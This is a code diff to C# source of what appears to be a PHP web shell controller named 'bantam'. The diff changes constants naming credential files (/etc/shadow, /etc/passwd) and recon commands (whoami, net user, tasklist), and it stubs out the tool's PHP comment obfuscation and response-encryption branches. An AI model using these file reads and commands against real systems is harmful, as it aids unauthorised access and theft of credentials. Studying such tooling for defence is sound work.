@@ -27,7 +27,7 @@ namespace bantam.Classes
         /// <summary>
         /// 
         /// </summary>
-        public const string rowSeperator = "|=$=|";
+        public const  string rowSeperator = "|=$=|";
 
         /// <summary>
         /// 
@@ -42,29 +42,29 @@ namespace bantam.Classes
         /// <summary>
         /// Linux File Locations
         /// </summary>
-        public static string linuxFS_ShadowFile = "/etc/shadow";
-        public static string linuxFS_PasswdFile = "/etc/passwd";
-        public static string linuxFS_IssueFile = "/etc/issue.net";
-        public static string linuxFS_hostTargetsFile = "/etc/hosts";
-        public static string linuxFS_ProcVersion = "/proc/version";
-        public static string linuxFS_NetworkInterfaces = "/etc/network/interfaces";
+        public const string linuxFS_ShadowFile = "/etc/shadow";
+        public const string linuxFS_PasswdFile = "/etc/passwd";
+        public const string linuxFS_IssueFile = "/etc/issue.net";
+        public const string linuxFS_hostTargetsFile = "/etc/hosts";
+        public const string linuxFS_ProcVersion = "/proc/version";
+        public const string linuxFS_NetworkInterfaces = "/etc/network/interfaces";
 
         /// <summary>
         /// Windows File Locations
         /// </summary>
-        public static string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";
+        public const string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";
 
         /// <summary>
         /// OS Commands
         /// </summary>
-        public static string linuxOS_PsAux = "ps aux";
-        public static string linuxOS_Ifconfig = "ifconfig";
-        public static string windowsOS_Ipconfig = "ipconfig";
-        public static string windowsOS_TaskList = "tasklist";
-        public static string windowsOS_NetUser = "net user";
-        public static string windowsOS_NetAccounts = "net accounts";
-        public static string windowsOS_Ver = "ver";
-        public static string posixOS_Whoami = "whoami";
+        public const string linuxOS_PsAux = "ps aux";
+        public const string linuxOS_Ifconfig = "ifconfig";
+        public const string windowsOS_Ipconfig = "ipconfig";
+        public const string windowsOS_TaskList = "tasklist";
+        public const string windowsOS_NetUser = "net user";
+        public const string windowsOS_NetAccounts = "net accounts";
+        public const string windowsOS_Ver = "ver";
+        public const string posixOS_Whoami = "whoami";
 
         /// <summary>
         /// 
@@ -84,6 +84,7 @@ namespace bantam.Classes
         /// <returns></returns>
         public static string RandomPHPComment(int maxNum = 32)
         {
+            return "";   
             //check global cfg check "" if off, and have a slider for amount of comments, and a slider for length of comments
             int length = Helper.RandomNumber(maxNum);
             return "/*" + Helper.RandomString(length, true, true) + "*/";
@@ -140,16 +141,12 @@ namespace bantam.Classes
                               + varName + " = base64_encode(" + varName + ");"
                               + RandomPHPComment();
 
-            switch (responseEncryptionMode) {
-                case (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL:
+            if (responseEncryptionMode == (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL) {
                 encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
-                break;
-                case (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.MCRYPT:
+            } else if (responseEncryptionMode == (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.MCRYPT) {
                 encryption += McryptEncryption(varName, encryptionKey, encryptionIV);
-                break;
-                default:
-                encryption += OpenSSLEncryption(varName, encryptionKey, encryptionIV);
-                break;
+            } else {
+                //todo global logging
             }
 
             encryption += RandomPHPComment();
@@ -531,7 +528,6 @@ namespace bantam.Classes
         public static string DirectoryEnumerationCode(string location, string phpVersion, bool responseEncryption)
         {
             string varItem = RandomPHPVar();
-            string varFile = RandomPHPVar();
 
             if (responseEncryption) {
                 return RandomPHPComment()
